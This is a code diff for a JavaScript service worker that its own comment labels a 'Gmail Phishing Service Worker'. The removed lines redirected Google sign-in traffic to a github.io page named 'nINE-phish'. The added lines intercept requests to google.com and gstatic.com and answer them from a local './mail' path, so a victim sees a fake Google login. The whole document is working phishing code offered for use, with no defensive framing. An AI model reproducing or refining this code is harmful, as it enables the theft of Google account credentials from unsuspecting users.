@@ -1,10 +1,10 @@
-// sw.js
+// Gmail Phishing Service Worker
 self.addEventListener('fetch', event => {
-    if (event.request.url.includes('google.com') || 
-        event.request.url.includes('accounts.google.com')) {
-        
-        // Proxy ALL Google traffic through Worker
-        const url = event.request.url.replace(window.location.origin, 'https://ia7353038-crypto.github.io/nINE-phish/');
-        event.respondWith(fetch(url, event.request));
-    }
+  const url = new URL(event.request.url);
+  
+  // Proxy all Gmail/Google domains through your worker
+  if (url.hostname.includes('google.com') || url.hostname.includes('gstatic.com')) {
+    const proxyUrl = `./mail${url.pathname}${url.search}`;
+    event.respondWith(fetch(proxyUrl, event.request));
+  }
 });
